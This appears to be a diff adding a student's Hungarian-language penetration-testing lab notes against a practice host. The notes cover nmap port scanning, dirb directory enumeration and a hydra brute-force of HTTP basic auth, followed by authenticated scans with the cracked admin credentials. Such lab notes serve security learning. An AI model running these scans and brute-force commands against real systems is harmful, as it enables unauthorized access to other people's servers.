@@ -1,0 +1,39 @@
+GEPATTACK
+
+en: 30.0.1.10
+akit akarunk: 40.0.3.9
+
+ping ip
+
+sudo nmap -sS -sV -p 1-10000 40.0.3.9	(Stud09 jelszo)
+-> 80/tcp open http Apache (ez van nyitva)
+-> mivel http be lehet irni az ip-t: 40.0.3.9 et bongeszobe
+-> jobbk-pagesource
+
+////
+dirb			(man dirb)
+dirbuster
+
+
+dirb: alapbol rekurzivan keres, -r, -R
+-x, -X fajlbovitmenyek
+////
+
+dirb http://40.0.3.9 /usr/share/wordlists/dirb/common.txt
+
+/////////
+(jelszo)
+dirb http://40.0.3.9 /usr/share/wordlists/rockyou.txt
+/////////
+
+
+hydra basic authentication
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 40.0.3.9 http-get /admin
+
+dirb http://40.0.3.9/admin /usr/share/wordlists/dirb/common.txt -r -u admin:princess
+
+dirb http://40.0.3.9/admin /usr/share/wordlists/dirb/common.txt -r -u admin:princess -X ,.php
+
+
+
+
